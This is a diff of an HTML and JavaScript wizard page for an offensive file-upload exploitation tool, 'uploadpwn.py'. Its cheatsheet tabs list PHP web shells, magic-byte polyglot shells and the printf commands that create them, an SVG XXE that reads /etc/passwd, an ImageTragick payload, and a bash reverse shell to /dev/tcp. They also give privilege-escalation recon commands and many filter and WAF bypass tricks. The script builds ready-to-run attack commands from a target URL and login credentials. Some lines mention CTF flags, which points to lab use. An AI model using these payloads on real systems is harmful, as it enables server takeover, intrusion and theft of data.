+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<div class="panel" id="panel-6">
+  <div class="phase-indicator">
+    <div class="num">07</div>
+    <div class="info">
+      <div class="title">Generated Commands</div>
+      <div class="desc">Copy these commands and run them in your terminal.</div>
+    </div>
+  </div>
+
+  <div id="generatedOutput"></div>
+
+  <div class="btn-row">
+    <button class="btn" onclick="goStep(5)">&larr; Back: Edit Options</button>
+    <button class="btn" onclick="generateCommand()">Regenerate</button>
+    <button class="btn primary" onclick="goStep(7)">Curl One-Liners &rarr;</button>
+  </div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<!-- STEP 7: CURL ONE-LINERS -->
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<div class="panel" id="panel-7">
+  <div class="phase-indicator">
+    <div class="num">08</div>
+    <div class="info">
+      <div class="title">Manual Curl One-Liners</div>
+      <div class="desc">For manual testing in Burp or when you want to understand exactly what's happening.</div>
+    </div>
+  </div>
+
+  <div id="curlOutput"></div>
+
+  <div class="btn-row">
+    <button class="btn" onclick="goStep(6)">&larr; Back</button>
+    <button class="btn primary" onclick="goStep(8)">Cheatsheet &rarr;</button>
+  </div>
+</div>
+
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<!-- STEP 8: CHEATSHEET -->
+<!-- ═════════════════════════════════════════════════════════════════════════ -->
+<div class="panel" id="panel-8">
+  <div class="phase-indicator">
+    <div class="num">09</div>
+    <div class="info">
+      <div class="title">Quick Reference Cheatsheet</div>
+      <div class="desc">Common patterns, payloads, and post-exploitation commands.</div>
+    </div>
+  </div>
+
+  <div class="tab-bar">
+    <div class="tab active" onclick="cheatTab(this,'cs-ext')">Extensions</div>
+    <div class="tab" onclick="cheatTab(this,'cs-magic')">Magic Bytes</div>
+    <div class="tab" onclick="cheatTab(this,'cs-payloads')">Shell Payloads</div>
+    <div class="tab" onclick="cheatTab(this,'cs-post')">Post-Exploit</div>
+    <div class="tab" onclick="cheatTab(this,'cs-filters')">Filter Bypass</div>
+    <div class="tab" onclick="cheatTab(this,'cs-v7')">v7.0 New</div>
+  </div>
+
+  <div class="tab-content active" id="cs-ext">
+    <div class="cmd-block"><span class="comment"># PHP Extensions</span>
+.php .php3 .php4 .php5 .php7 .php8 .phtml .phar .pht .pgif .inc
+.PHP .Php .pHp .phP .PHp .PhP .pHP
+
+<span class="comment"># ASP/IIS Extensions</span>
+.asp .aspx .ashx .asmx .ascx .cshtml .vbhtml
+
+<span class="comment"># JSP Extensions</span>
+.jsp .jspx .jsw .jsv .jtml .jhtml
+
+<span class="comment"># ColdFusion Extensions</span>
+.cfm .cfml .cfc .dbm
+
+<span class="comment"># Double Extension Tricks</span>
+shell.php.jpg    shell.jpg.php    shell.php.png
+shell.phtml.jpg  shell.pht.gif    shell.inc.png
+
+<span class="comment"># Null Byte</span>
+shell.php%00.jpg     <span class="comment"># URL-encoded</span>
+shell.php\x00.jpg    <span class="comment"># Raw byte</span>
+shell.php%2500.jpg   <span class="comment"># Double URL-encoded</span>
+
+<span class="comment"># IIS Tricks</span>
+shell.aspx;.jpg      <span class="comment"># Semicolon trick</span>
+shell.asp::$DATA     <span class="comment"># NTFS ADS</span>
+
+<span class="comment"># Trailing Characters</span>
+shell.php.   shell.php..   shell.php/   shell.php%20   shell.php::$DATA</div>
+  </div>
+
+  <div class="tab-content" id="cs-magic">
+    <div class="cmd-block"><span class="comment"># Prepend these bytes before your PHP code</span>
+
+<span class="comment"># GIF</span>
+GIF89a;
+&lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="comment"># PNG</span>
+\x89PNG\r\n\x1a\n
+&lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="comment"># JPEG</span>
+\xff\xd8\xff\xe0
+&lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="comment"># PDF</span>
+%PDF-1.4
+&lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="comment"># BMP</span>
+BM
+&lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="comment"># Create with printf:</span>
+printf 'GIF89a;\n&lt;?php system($_GET["cmd"]); ?&gt;' > shell.gif.php
+printf '\x89PNG\r\n\x1a\n&lt;?=\x60$_GET[0]\x60?&gt;' > shell.png.php</div>
+  </div>
+
+  <div class="tab-content" id="cs-payloads">
+    <div class="cmd-block"><span class="comment"># PHP Shells</span>
+&lt;?php system($_GET['cmd']); ?&gt;              <span class="comment"># Standard</span>
+&lt;?=`$_GET[0]`?&gt;                             <span class="comment"># Tiny (17 bytes)</span>
+&lt;?php passthru($_GET['cmd']); ?&gt;            <span class="comment"># passthru</span>
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;     <span class="comment"># shell_exec</span>
+&lt;?php echo exec($_GET['cmd']); ?&gt;           <span class="comment"># exec</span>
+
+<span class="comment"># .htaccess (make .jpg execute PHP)</span>
+AddType application/x-httpd-php .jpg .png .gif
+
+<span class="comment"># SVG XXE (read /etc/passwd)</span>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
+
+<span class="comment"># SVG XSS</span>
+&lt;svg onload="alert(document.domain)"&gt;&lt;/svg&gt;
+
+<span class="comment"># ImageTragick (CVE-2016-3714)</span>
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/x.jpg"|id")'
+pop graphic-context</div>
+  </div>
+
+  <div class="tab-content" id="cs-post">
+    <div class="cmd-block"><span class="comment"># Quick recon after shell</span>
+?cmd=id;whoami;uname+-a;ip+a
+
+<span class="comment"># Find flags (CTF)</span>
+?cmd=cat+/flag.txt
+?cmd=find+/+-name+"flag*"+-type+f+2>/dev/null
+?cmd=find+/+-name+"*.txt"+-exec+grep+-l+"HTB{"+{}+%2b+2>/dev/null
+?cmd=cat+/home/*/user.txt
+?cmd=cat+/root/root.txt
+
+<span class="comment"># Reverse shell</span>
+?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261"
+
+<span class="comment"># Privilege escalation recon</span>
+?cmd=sudo+-l
+?cmd=find+/+-perm+-4000+-type+f+2>/dev/null
+?cmd=getcap+-r+/+2>/dev/null
+?cmd=cat+/etc/crontab
+?cmd=ls+-la+/etc/cron*
+
+<span class="comment"># Upgrade to interactive</span>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl+Z  &rarr;  stty raw -echo; fg  &rarr;  export TERM=xterm</div>
+  </div>
+
+  <div class="tab-content" id="cs-filters">
+    <div class="cmd-block"><span class="comment"># Filter: Extension Blacklist</span>
+<span class="flag">Bypass:</span> .phtml .pht .php5 .phar .pgif .inc
+<span class="flag">Bypass:</span> Case variation: .PHP .pHp .Php
+<span class="flag">Bypass:</span> Double ext: shell.php.jpg or shell.jpg.php
+<span class="flag">Bypass:</span> Null byte: shell.php%00.jpg
+
+<span class="comment"># Filter: Extension Whitelist</span>
+<span class="flag">Bypass:</span> Double ext: shell.php.jpg (if Apache AddHandler)
+<span class="flag">Bypass:</span> .htaccess upload to make .jpg = PHP
+<span class="flag">Bypass:</span> Null byte: shell.php%00.jpg
+
+<span class="comment"># Filter: Content-Type Header</span>
+<span class="flag">Bypass:</span> Set Content-Type: image/jpeg in upload request
+
+<span class="comment"># Filter: MIME / Magic Bytes</span>
+<span class="flag">Bypass:</span> Prepend GIF89a; or \x89PNG before PHP code
+
+<span class="comment"># Filter: Image Validator (getimagesize/finfo)</span>
+<span class="flag">Bypass:</span> Real polyglot &mdash; valid image with PHP in metadata
+<span class="flag">Bypass:</span> PNG with PHP in tEXt chunk (passes CRC check)
+<span class="flag">Bypass:</span> JPEG with PHP in COM marker
+<span class="flag">Bypass:</span> GIF with PHP in comment extension
+
+<span class="comment"># Filter: Size Limit</span>
+<span class="flag">Bypass:</span> Tiny shell: &lt;?=`$_GET[0]`?&gt; (17 bytes)
+<span class="flag">Bypass:</span> Chunked Transfer-Encoding
+
+<span class="comment"># Filter: WAF</span>
+<span class="flag">Bypass:</span> Multipart boundary manipulation
+<span class="flag">Bypass:</span> Double Content-Disposition header
+<span class="flag">Bypass:</span> Extra MIME part with innocent file first
+
+<span class="comment"># Upload dir not web-accessible</span>
+<span class="flag">Bypass:</span> LFI chaining: ?file=../uploads/shell.php
+<span class="flag">Bypass:</span> Zip Slip: path traversal in archive to write to webroot</div>
+  </div>
+
+  <div class="tab-content" id="cs-v7">
+    <div class="cmd-block"><span class="comment"># ═══ v7.0 New Attacks ═══</span>
+
+<span class="comment"># Filename Injection (--filename-inject)</span>
+<span class="flag">OS Command:</span> file$(whoami).jpg  file`id`.jpg  file;id;.jpg
+<span class="flag">XSS:</span> &lt;script&gt;alert(1)&lt;/script&gt;.jpg
+<span class="flag">SQLi:</span> file' OR '1'='1.jpg
+
+<span class="comment"># EXIF XSS (--exif-xss)</span>
+Upload real JPEG with XSS in EXIF Comment field
+If metadata is displayed on page, XSS triggers
+
+<span class="comment"># Document XXE (--docx-xxe / --xlsx-xxe)</span>
+DOCX/XLSX with XXE entity in XML content
+Targets document processors that parse XML
+
+<span class="comment"># Decompression Bomb (--bomb)</span>
+Small ZIP that expands to huge size (nested compression)
+Tests for zip extraction without size limits
+
+<span class="comment"># Pixel Flood (--pixel-flood)</span>
+Valid PNG header declaring 65535x65535 dimensions
+Minimal actual data &mdash; crashes image processors
+
+<span class="comment"># Windows 8.3 Short Names (--win83)</span>
+SHELL~1.PHP  SHELL~1.ASP  HTACCE~1  WEB~1.CON
+Bypasses filters that don't handle legacy names
+
+<span class="comment"># .user.ini Attack (--userini)</span>
+Nginx/CGI equivalent of .htaccess &mdash; auto_prepend_file
+Upload .user.ini + shell.gif with GIF89a magic bytes
+
+<span class="comment"># SSI Injection (--ssi)</span>
+Upload .shtml with &lt;!--#exec cmd="id"--&gt;
+Works when Apache has mod_include enabled
+
+<span class="comment"># Path Traversal (--path-traversal)</span>
+../../../etc/cron.d/shell  ....//....//shell.php
+Overlong UTF-8: %c0%ae%c0%ae/ and %2e%2e%2f sequences
+
+<span class="comment"># Unicode Normalization (--unicode)</span>
+Fullwidth: ．ｐｈｐ  Homoglyphs: .php with Cyrillic chars
+Zero-width joiners between extension chars
+
+<span class="comment"># HTTP PUT Upload (--put-upload)</span>
+Bypass form-based upload via PUT /uploads/shell.php
+Tries PUT, PATCH, MOVE methods with various paths
+
+<span class="comment"># Stored XSS (--stored-xss)</span>
+PDF with JS, HTML file with scripts, SVG with onload
+Tests if uploaded files are served without sanitization
+
+<span class="comment"># CGI Scripts (--cgi)</span>
+Upload .pl .cgi .py .sh scripts to cgi-bin/ paths
+Works on servers with CGI execution enabled
+
+<span class="comment"># Double Content-Disposition (--double-cd)</span>
+Two C-D headers: first with .jpg, second with .php
+Exploits parsers that use last/first header differently
+
+<span class="comment"># Phar Deserialization (--phar-deser)</span>
+Upload .phar files or polyglot JPEG-PHAR
+Triggers via phar:// stream wrapper in file operations
+
+<span class="comment"># PHP-FPM Pathinfo (--phpfpm-pathinfo)</span>
+Upload shell.jpg, request shell.jpg/x.php
+Exploits cgi.fix_pathinfo=1 (default on most PHP-FPM)
+
+<span class="comment"># Multipart Pollution (--multipart-pollute)</span>
+Send 2 file parts: WAF checks first (safe.jpg)
+Backend processes last (shell.php) &mdash; or vice versa
+
+<span class="comment"># CTE Base64 (--cte-base64)</span>
+Content-Transfer-Encoding: base64 in multipart body
+WAF sees base64 text, backend decodes to PHP shell
+
+<span class="comment"># Path Truncation (--path-truncation)</span>
+shell.php + 240 A's + .jpg &rarr; NTFS truncates to shell.php
+Windows only: 255-char filename limit exploited
+
+<span class="comment"># Apache .php.xxx (--apache-unrecognized)</span>
+shell.php.foobar &mdash; Apache mod_mime falls back
+to .php handler since .foobar is unrecognized
+
+<span class="comment"># SSRF Metadata (--ssrf-metadata)</span>
+SVG XXE targeting http://169.254.169.254/
+Hits AWS/GCP/Azure/DO metadata endpoints
+
+<span class="comment"># Ghostscript RCE (--ghostscript)</span>
+Upload .eps/.ps with %pipe% injection (CVE-2023-36664)
+Works when server processes images via Ghostscript
+
+<span class="comment"># htaccess Race (--htaccess-race)</span>
+Parallel upload .htaccess + shell.jpg simultaneously
+TOCTOU: if .htaccess lands first, .jpg executes as PHP
+
+<span class="comment"># SmartRecon (--smart)</span>
+Auto-crawls target, finds JS-driven upload endpoints
+Discovers AJAX uploads in script.js files
+Use --crawl-depth N to control depth (default: 2)
+
+<span class="comment"># Filter Matrix (--filter-matrix)</span>
+Systematic N*M*K testing of extension + CT + magic combos
+Tells you EXACTLY which combinations pass all filters
+
+<span class="comment"># Human-in-the-Loop</span>
+When auto-detection fails, prompts for endpoint/field
+Disable with --no-interact to use defaults silently</div>
+  </div>
+
+  <div class="btn-row">
+    <button class="btn" onclick="goStep(7)">&larr; Back</button>
+    <button class="btn primary" onclick="goStep(6)">Back to Commands</button>
+  </div>
+</div>
+
+</div><!-- .app -->
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════════
+//  CUSTOM SELECT — replaces all <select> with click-based dropdowns
+// ═══════════════════════════════════════════════════════════════════════════
+function buildCustomSelects() {
+  document.querySelectorAll('select:not(.cs-hidden)').forEach(sel => {
+    sel.classList.add('cs-hidden');
+
+    const wrap = document.createElement('div');
+    wrap.className = 'custom-select';
+    wrap.dataset.for = sel.id;
+
+    const display = document.createElement('div');
+    display.className = 'cs-display';
+    const selectedOpt = sel.options[sel.selectedIndex];
+    display.textContent = selectedOpt ? selectedOpt.textContent : '';
+
+    const optBox = document.createElement('div');
+    optBox.className = 'cs-options';
+
+    Array.from(sel.options).forEach(opt => {
+      const div = document.createElement('div');
+      div.className = 'cs-option' + (opt.value === sel.value ? ' selected' : '');
+      div.textContent = opt.textContent;
+      div.dataset.value = opt.value;
+      div.addEventListener('click', function(e) {
+        e.stopPropagation();
+        sel.value = this.dataset.value;
+        display.textContent = this.textContent;
+        optBox.querySelectorAll('.cs-option').forEach(o => o.classList.remove('selected'));
+        this.classList.add('selected');
+        wrap.classList.remove('open');
+        sel.dispatchEvent(new Event('change'));
+      });
+      optBox.appendChild(div);
+    });
+
+    display.addEventListener('click', function(e) {
+      e.stopPropagation();
+      // Close all other open dropdowns first
+      document.querySelectorAll('.custom-select.open').forEach(cs => {
+        if (cs !== wrap) cs.classList.remove('open');
+      });
+      wrap.classList.toggle('open');
+    });
+
+    wrap.appendChild(display);
+    wrap.appendChild(optBox);
+    sel.parentNode.insertBefore(wrap, sel);
+  });
+}
+
+// Close dropdowns when clicking outside
+document.addEventListener('click', function() {
+  document.querySelectorAll('.custom-select.open').forEach(cs => cs.classList.remove('open'));
+});
+
+// Helper: update a custom select display when the hidden select value changes programmatically
+function syncCustomSelect(selectId) {
+  const sel = document.getElementById(selectId);
+  if (!sel) return;
+  const wrap = document.querySelector('.custom-select[data-for="' + selectId + '"]');
+  if (!wrap) return;
+  const display = wrap.querySelector('.cs-display');
+  const selectedOpt = sel.options[sel.selectedIndex];
+  if (display && selectedOpt) {
+    display.textContent = selectedOpt.textContent;
+    wrap.querySelectorAll('.cs-option').forEach(o => {
+      o.classList.toggle('selected', o.dataset.value === sel.value);
+    });
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  STATE
+// ═══════════════════════════════════════════════════════════════════════════
+let currentStep = 0;
+const totalSteps = 9;
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  NAVIGATION
+// ═══════════════════════════════════════════════════════════════════════════
+function goStep(n) {
+  if (n < 0 || n >= totalSteps) return;
+  // Mark previous as done
+  if (n > currentStep) {
+    for (let i = 0; i <= currentStep; i++) {
+      document.querySelectorAll('.wizard .step')[i].classList.add('done');
+    }
+  }
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.wizard .step').forEach(s => s.classList.remove('active'));
+  document.getElementById('panel-' + n).classList.add('active');
+  document.querySelectorAll('.wizard .step')[n].classList.add('active');
+  currentStep = n;
+  window.scrollTo({top: 0, behavior: 'smooth'});
+
+  // Auto-generate on step 6
+  if (n === 6) generateCommand();
+  if (n === 7) generateCurls();
+
+  // Update recon curl with target
+  updateReconCurl();
+}
+
+document.querySelectorAll('.wizard .step').forEach(s => {
+  s.addEventListener('click', () => goStep(parseInt(s.dataset.step)));
+});
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  AUTH TOGGLES
+// ═══════════════════════════════════════════════════════════════════════════
+function toggleAuthFields() {
+  const m = document.getElementById('authMethod').value;
+  document.getElementById('authFields').style.display = (m === 'login' || m === 'selenium') ? 'block' : 'none';
+  document.getElementById('cookieFields').style.display = m === 'cookie' ? 'block' : 'none';
+  document.getElementById('headerFields').style.display = m === 'header' ? 'block' : 'none';
+  // Show advanced fields for login
+  const advanced = m === 'login' || m === 'selenium';
+  document.getElementById('authUserFieldGroup').style.display = advanced ? 'block' : 'none';
+  document.getElementById('authPassFieldGroup').style.display = advanced ? 'block' : 'none';
+  document.getElementById('authNavGroup').style.display = advanced ? 'block' : 'none';
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  MODULE TOGGLES
+// ═══════════════════════════════════════════════════════════════════════════
+document.querySelectorAll('.toggle-item').forEach(item => {
+  const cb = item.querySelector('input[type="checkbox"]');
+  if (cb) {
+    const update = () => item.classList.toggle('on', cb.checked);
+    cb.addEventListener('change', () => { update(); toggleModuleExtras(); });
+    update();
+  }
+});
+
+function selectAllModules() {
+  document.querySelectorAll('#panel-4 .toggle-item input[type="checkbox"]').forEach(cb => {
+    cb.checked = true;
+    cb.dispatchEvent(new Event('change'));
+  });
+}
+function clearAllModules() {
+  document.querySelectorAll('#panel-4 .toggle-item input[type="checkbox"]').forEach(cb => {
+    cb.checked = false;
+    cb.dispatchEvent(new Event('change'));
+  });
+}
+
+function smartSelect() {
+  clearAllModules();
+  const st = document.getElementById('serverType').value;
+  const autoCheck = (flag) => {
+    const item = document.querySelector(`#panel-4 .toggle-item[data-flag="${flag}"] input`);
+    if (item) { item.checked = true; item.dispatchEvent(new Event('change')); }
+  };
+  // Always
+  autoCheck('--matrix');
+  autoCheck('--ext-fuzz');
+  autoCheck('--discover');
+  autoCheck('--error-disclose');
+  autoCheck('--polyglot');
+  autoCheck('--char-inject');
+  autoCheck('--filename-inject');
+  if (st === 'php' || st === 'all') { autoCheck('--htaccess'); autoCheck('--svg-read'); autoCheck('--svg-src'); autoCheck('--lfi'); autoCheck('--docx-xxe'); }
+  if (st === 'asp' || st === 'all') { autoCheck('--webconfig'); autoCheck('--iis-semicolon'); autoCheck('--win83'); }
+  if (st === 'jsp' || st === 'all') { autoCheck('--war'); autoCheck('--zip'); }
+  autoCheck('--race');
+  autoCheck('--raw-null');
+  autoCheck('--chunked');
+  autoCheck('--exif-xss');
+}
+
+function toggleModuleExtras() {
+  const isChecked = (flag) => {
+    const el = document.querySelector(`.toggle-item[data-flag="${flag}"] input`);
+    return el && el.checked;
+  };
+  document.getElementById('svgReadPath').style.display = isChecked('--svg-read') ? 'block' : 'none';
+  document.getElementById('svgSrcFile').style.display = isChecked('--svg-src') ? 'block' : 'none';
+  document.getElementById('symlinkFile').style.display = isChecked('--symlink-zip') ? 'block' : 'none';
+  document.getElementById('docxXxePath').style.display = isChecked('--docx-xxe') ? 'block' : 'none';
+  document.getElementById('xlsxXxePath').style.display = isChecked('--xlsx-xxe') ? 'block' : 'none';
+  document.getElementById('imagetragickReadFile').style.display = isChecked('--imagetragick') ? 'block' : 'none';
+  document.getElementById('imagetragickRevshell').style.display = isChecked('--imagetragick') ? 'block' : 'none';
+  document.getElementById('wordlistFile').style.display = isChecked('--dir-enum') ? 'block' : 'none';
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  RECON ANALYSIS
+// ═══════════════════════════════════════════════════════════════════════════
+function updateReconCurl() {
+  const t = document.getElementById('target').value || 'http://TARGET';
+  document.getElementById('reconCurl').textContent = `curl -sI ${t} | grep -iE 'server|x-powered|x-asp'`;
+}
+document.getElementById('target').addEventListener('input', updateReconCurl);
+
+function analyzeRecon() {
+  const raw = document.getElementById('reconPaste').value;
+  if (!raw.trim()) return;
+  const out = document.getElementById('reconAnalysis');
+  let html = '';
+  const lower = raw.toLowerCase();
+  const findings = [];
+
+  if (lower.includes('apache')) findings.push({key: 'Server', val: 'Apache detected', tip: 'Try --htaccess, PHP payloads will work', color: 'green'});
+  if (lower.includes('nginx')) findings.push({key: 'Server', val: 'Nginx detected', tip: '.htaccess will NOT work on Nginx. Focus on extension tricks and polyglots.', color: 'yellow'});
+  if (lower.includes('microsoft-iis') || lower.includes('asp.net')) findings.push({key: 'Server', val: 'IIS / ASP.NET detected', tip: 'Use --server-type asp, try --webconfig --iis-semicolon --win83', color: 'green'});
+  if (lower.includes('tomcat') || lower.includes('jboss') || lower.includes('java')) findings.push({key: 'Server', val: 'Java application server', tip: 'Use --server-type jsp, try --war for WAR deployment', color: 'green'});
+  if (/x-powered-by:.*php/i.test(raw)) {
+    const m = raw.match(/PHP\/([\d.]+)/i);
+    const ver = m ? m[1] : 'unknown';
+    findings.push({key: 'PHP Version', val: ver, tip: ver < '5.3.4' ? 'OLD PHP! Null byte (%00) will work!' : 'Modern PHP. Null byte unlikely. Try double ext, polyglots.', color: ver < '5.3.4' ? 'green' : 'yellow'});
+  }
+  if (lower.includes('coldfusion')) findings.push({key: 'Server', val: 'ColdFusion detected', tip: 'Use --server-type cf', color: 'green'});
+  if (lower.includes('express') || lower.includes('node')) findings.push({key: 'Server', val: 'Node.js / Express', tip: 'Focus on path traversal, zip slip, race condition', color: 'yellow'});
+
+  if (findings.length === 0) {
+    findings.push({key: 'Analysis', val: 'No specific technology detected from headers', tip: 'Server might be hiding headers. Run with --server-type all for maximum coverage.', color: 'yellow'});
+  }
+
+  html = '<div style="margin-top:16px">';
+  findings.forEach(f => {
+    html += `<div class="info-box ${f.color === 'green' ? 'success' : 'warn'}"><strong>${f.key}:</strong> ${f.val}<br>${f.tip}</div>`;
+  });
+
+  // Auto-set server type based on findings
+  const sel = document.getElementById('serverType');
+  if (lower.includes('microsoft-iis') || lower.includes('asp.net')) sel.value = 'asp';
+  else if (lower.includes('tomcat') || lower.includes('jboss')) sel.value = 'jsp';
+  else if (lower.includes('coldfusion')) sel.value = 'cf';
+  else if (/x-powered-by:.*php/i.test(raw)) sel.value = 'php';
+  syncCustomSelect('serverType');
+
+  html += '</div>';
+  out.innerHTML = html;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  COMMAND GENERATOR
+// ═══════════════════════════════════════════════════════════════════════════
+function getVal(id) {
+  const el = document.getElementById(id);
+  if (!el) return '';
+  return el.value.trim();
+}
+
+function generateCommand() {
+  const target = getVal('target');
+  if (!target) { alert('Enter a target URL first (Step 1)'); goStep(0); return; }
+
+  const parts = ['python3 uploadpwn.py'];
+  parts.push(`-t ${target}`);
+
+  // Server type
+  const st = getVal('serverType');
+  if (st && st !== 'all') parts.push(`--server-type ${st}`);
+
+  // Auth
+  const authM = getVal('authMethod');
+  if (authM === 'login' || authM === 'selenium') {
+    const lp = getVal('loginPath');
+    if (lp) parts.push(`--login ${lp}`);
+    const u = getVal('authUser');
+    if (u) parts.push(`--user ${u}`);
+    const p = getVal('authPass');
+    if (p) parts.push(`--pass '${p}'`);
+    const uf = getVal('authUserField');
+    if (uf && uf !== 'username') parts.push(`--user-field ${uf}`);
+    const pf = getVal('authPassField');
+    if (pf && pf !== 'password') parts.push(`--pass-field ${pf}`);
+    if (authM === 'selenium') parts.push('--login-method selenium');
+    const nav = getVal('authNav');
+    if (nav) parts.push(`--nav ${nav}`);
+  }
+  if (authM === 'cookie') {
+    const cv = getVal('cookieValue');
+    if (cv) {
+      cv.split(';').forEach(c => {
+        c = c.trim();
+        if (c) parts.push(`--cookie "${c}"`);
+      });
+    }
+  }
+  if (authM === 'header') {
+    const hv = getVal('headerValue');
+    if (hv) parts.push(`--header "${hv}"`);
+  }
+
+  // Upload config
+  const up = getVal('uploadPage');
+  if (up) parts.push(`--upload-page ${up}`);
+  const ep = getVal('endpoint');
+  if (ep) parts.push(`-e ${ep}`);
+  const fn = getVal('fieldName');
+  if (fn) parts.push(`--field ${fn}`);
+  const cp = getVal('cmdParam');
+  if (cp && cp !== 'cmd') parts.push(`--cmd-param ${cp}`);
+  const fp = getVal('flagPath');
+  if (fp && fp !== '/flag.txt') parts.push(`--flag ${fp}`);
+  const sd = getVal('shellDirs');
+  if (sd) parts.push(`--shell-dirs ${sd}`);
+
+  // Collect module flags from panel-4 only (attack modules)
+  const moduleFlags = [...document.querySelectorAll('#panel-4 .toggle-item')].filter(i => {
+    const cb = i.querySelector('input');
+    return cb && cb.checked && i.dataset.flag;
+  }).map(i => i.dataset.flag);
+
+  // Collect option flags from panel-5 (scan options toggles)
+  const optionFlags = [...document.querySelectorAll('#panel-5 .toggle-item')].filter(i => {
+    const cb = i.querySelector('input');
+    return cb && cb.checked && i.dataset.flag;
+  }).map(i => i.dataset.flag);
+
+  // Decide --all vs individual flags
+  if (moduleFlags.length >= 20) {
+    parts.push('--all');
+  } else {
+    moduleFlags.forEach(f => {
+      if (f === '--svg-read') { parts.push(`--svg-read ${getVal('svgReadValue') || '/flag.txt'}`); return; }
+      if (f === '--svg-src') { parts.push(`--svg-src ${getVal('svgSrcValue') || 'upload.php'}`); return; }
+      if (f === '--symlink-zip') { parts.push(`--symlink-zip ${getVal('symlinkValue') || '/etc/passwd'}`); return; }
+      if (f === '--docx-xxe') { parts.push(`--docx-xxe ${getVal('docxXxeValue') || '/etc/passwd'}`); return; }
+      if (f === '--xlsx-xxe') { parts.push(`--xlsx-xxe ${getVal('xlsxXxeValue') || '/etc/passwd'}`); return; }
+      parts.push(f);
+    });
+  }
+
+  // Imagetragick extras
+  if (moduleFlags.includes('--imagetragick')) {
+    const ir = getVal('imagetragickReadValue');
+    if (ir) parts.push(`--imagetragick-read ${ir}`);
+    const is_ = getVal('imagetragickRevshellValue');
+    if (is_) parts.push(`--imagetragick-revshell ${is_}`);
+  }
+  // Wordlist
+  if (moduleFlags.includes('--dir-enum')) {
+    const wl = getVal('wordlistValue');
+    if (wl) parts.push(`--wordlist ${wl}`);
+  }
+
+  // Option flags from panel-5
+  optionFlags.forEach(f => {
+    if (!parts.includes(f)) parts.push(f);
+  });
+
+  // Verbosity
+  const verb = getVal('verbosity');
+  if (verb) parts.push(verb);
+
+  // Other options
+  const proxy = getVal('proxy');
+  if (proxy) parts.push(`--proxy ${proxy}`);
+  const tout = getVal('timeout');
+  if (tout && tout !== '15') parts.push(`--timeout ${tout}`);
+  const thr = getVal('threads');
+  if (thr && thr !== '5') parts.push(`--threads ${thr}`);
+  const del = getVal('delay');
+  if (del && del !== '0') parts.push(`--delay ${del}`);
+  const cd = getVal('crawlDepth');
+  if (cd && cd !== '2') parts.push(`--crawl-depth ${cd}`);
+  const of = getVal('outputFile');
+  if (of && of !== 'uploadpwn_report.json') parts.push(`-o ${of}`);
+
+  // Build the final command string (wrap nicely)
+  const fullCmd = parts.join(' \\\n  ');
+  const oneLineCmd = parts.join(' ');
+
+  // Generate step-by-step approach too
+  const authStr = authM === 'cookie' && getVal('cookieValue') ? ` --cookie "${getVal('cookieValue')}"` : '';
+  const reconCmd = `python3 uploadpwn.py -t ${target} --discover --dir-enum --error-disclose${verb ? ' '+verb : ''}${proxy ? ' --proxy '+proxy : ''}${authStr}`;
+  const smartCmd = `python3 uploadpwn.py -t ${target}${ep ? ' -e '+ep : ''}${fn ? ' --field '+fn : ''}${authStr} --smart --interactive`;
+  const walkthroughCmd = `python3 uploadpwn.py -t ${target}${ep ? ' -e '+ep : ''}${fn ? ' --field '+fn : ''} --walkthrough`;
+
+  let html = '';
+
+  // Main command
+  html += `<h3 style="color:var(--green);margin-bottom:10px">Full Command</h3>`;
+  html += cmdBlock(fullCmd, 'bash', 'main-cmd');
+
+  // One-liner
+  html += `<h3 style="color:var(--cyan);margin-bottom:10px">One-Liner (copy-paste)</h3>`;
+  html += cmdBlock(oneLineCmd, 'bash', 'oneliner');
+
+  // Phased approach
+  html += `<h3 style="color:var(--yellow);margin:20px 0 10px">Recommended: Step-by-Step Approach</h3>`;
+  html += `<div class="info-box tip">Run these in order. Each step informs the next one.</div>`;
+
+  html += `<div style="color:var(--fg2);font-size:13px;margin-bottom:6px"><strong>Step 1:</strong> Recon &mdash; discover forms, dirs, error paths</div>`;
+  html += cmdBlock(reconCmd, 'bash', 'step1');
+
+  html += `<div style="color:var(--fg2);font-size:13px;margin-bottom:6px"><strong>Step 2:</strong> Smart mode &mdash; auto-detects endpoints, probes filters, picks best attacks</div>`;
+  html += cmdBlock(smartCmd, 'bash', 'step2');
+
+  html += `<div style="color:var(--fg2);font-size:13px;margin-bottom:6px"><strong>Step 3:</strong> See the walkthrough &mdash; get curl one-liners for your target</div>`;
+  html += cmdBlock(walkthroughCmd, 'bash', 'step3');
+
+  html += `<div style="color:var(--fg2);font-size:13px;margin-bottom:6px"><strong>Step 4:</strong> Full attack with your config</div>`;
+  html += cmdBlock(fullCmd, 'bash', 'step4');
+
+  document.getElementById('generatedOutput').innerHTML = html;
+  bindCopyButtons();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  CURL GENERATOR
+// ═══════════════════════════════════════════════════════════════════════════
+function generateCurls() {
+  const target = getVal('target') || 'http://TARGET';
+  const ep = getVal('endpoint') || '/upload.php';
+  const field = getVal('fieldName') || 'uploadFile';
+  const url = target + ep;
+
+  let cookieFlag = '';
+  if (getVal('authMethod') === 'cookie' && getVal('cookieValue')) {
